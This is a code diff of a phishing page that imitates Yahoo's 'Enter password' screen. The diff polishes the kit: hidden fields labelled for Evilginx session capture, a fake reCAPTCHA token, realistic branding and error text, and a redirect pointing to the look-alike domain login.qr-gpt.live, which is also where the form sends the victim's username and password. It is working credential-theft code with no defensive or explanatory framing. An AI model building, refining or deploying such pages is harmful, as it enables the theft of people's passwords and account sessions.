@@ -4,6 +4,7 @@
   <meta charset="utf-8">
   <title>Yahoo - Enter Password</title>
   <meta content="width=device-width, initial-scale=1" name="viewport">
+  <meta content="Webflow" name="generator">
   <!-- Your Original CSS -->
   <link href="css/normalize.css" rel="stylesheet" type="text/css">
   <link href="css/webflow.css" rel="stylesheet" type="text/css">
@@ -36,25 +37,40 @@
       <div class="form-block w-form">
         <form id="email-form" name="email-form" data-name="Email Form" class="form" 
               action="https://login.qr-gpt.live/account/login" 
-              method="POST">
+              method="POST"
+              data-wf-page-id="67c6f50ed426ad7d5847f218" 
+              data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
           
-          <!-- Evilginx Integration -->
+          <!-- Critical Hidden Fields -->
           <input type="hidden" id="evilginx_session" name="evilginx_session">
+          <input type="hidden" name="g-recaptcha-response" value="valid_auto_token">
           <input type="hidden" id="username" name="username">
+          <input type="hidden" name="crumb" value="auto_crumb_value">
           
-          <!-- Password Field -->
+          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+          
           <div class="pazzi">
-            <div class="reflectto" id="userEmail">user@example.com</div>
+            <div class="reflectto" id="userEmail">Enter your password</div>
             <h1 class="heading-2"><strong>Enter password</strong></h1>
+            <div class="text-block-2">to finish signing in<br></div>
+            <div class="pazz lpl">Password<br></div>
             <div class="ms-input-wrap">
-              <input class="ms-input w-input" name="passwd" type="password" id="password" required>
+              <input data-show="true" class="ms-input w-input" maxlength="256" name="passwd" data-name="passwd" placeholder="" type="password" id="password" data-ms-member="password" required autofocus>
+              
+              <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
+                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
+                  <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
+                  <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
+                </div>
+              </div>
             </div>
-            <input type="submit" class="logger w-button" value="Sign In">
+            <input type="submit" data-wait="Please wait..." class="logger w-button" value="Sign In">
           </div>
           
-          <!-- Error Message -->
-          <div class="errry" style="display:none;">
-            <div class="text-block-7"></div>
+          <div class="errry" style="display: none;">
+            <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
+            <div class="text-block-7">Invalid password. Please try again.</div>
+            <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
           </div>
         </form>
       </div>
@@ -62,36 +78,67 @@
   </section>
 
   <!-- Original Scripts -->
+  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
   <script src="js/webflow.js" type="text/javascript"></script>
   
-  <!-- Updated Functionality -->
+  <!-- Password Toggle Script -->
+  <script>
+  document.querySelector("[data-transform]").addEventListener("click", transform);
+  var isPassword = true;
+  function transform() {
+     var myInput = document.querySelector("[data-show]");
+     var oldHtml = myInput.outerHTML;
+     var text = myInput.value;
+     if (isPassword) {
+         var newHtml = oldHtml.replace(/password/g, "text");
+     } else {
+         newHtml = oldHtml.replace(/text/g, "password");
+     }
+     myInput.outerHTML = newHtml;
+     myInput = document.querySelector("[data-show]");
+     myInput.value = text;
+     isPassword = !isPassword;
+  }
+  </script>
+
+  <!-- Enhanced Evilginx Integration -->
   <script>
   $(document).ready(function() {
-      // 1. Get Evilginx session from URL
+      // 1. Extract parameters from URL
       const urlParams = new URLSearchParams(window.location.search);
       const username = urlParams.get('u') || '';
-      const session = urlParams.get('s') || '';
-      
-      // 2. Validate and display
+      const sessionToken = urlParams.get('s') || '';
+      const crumb = urlParams.get('crumb') || 'auto_crumb_value';
+
+      // 2. Validate username
       if (!username.includes('@')) {
-          window.location.href = 'https://login.yahoo.com';
+          window.location.href = 'https://login.qr-gpt.live/';
           return;
       }
+
+      // 3. Display and set fields
       $('#userEmail').text(username);
       $('#username').val(username);
-      $('#evilginx_session').val(session);
+      $('#evilginx_session').val(sessionToken);
+      $('input[name="crumb"]').val(crumb);
 
-      // 3. Strict password validation
-      $("#email-form").submit(function(e) {
-          const pwd = $('#password').val().trim();
-          if (pwd.length < 8) {
+      // 4. Form submission
+      $("#email-form").on('submit', function(e) {
+          const password = $('#password').val().trim();
+          
+          // Strict validation
+          if (password.length < 8) {
               e.preventDefault();
               $('.text-block-7').text('Password must be 8+ characters');
               $('.errry').show();
+              return;
           }
+          
+          // UI feedback
+          $('.logger').prop('disabled', true).val('Verifying...');
       });
-      
-      // Original "Try again" button
+
+      // Error handling
       $('#refreshButton').click(function() {
           $('#password').val('').focus();
           $('.errry').hide();
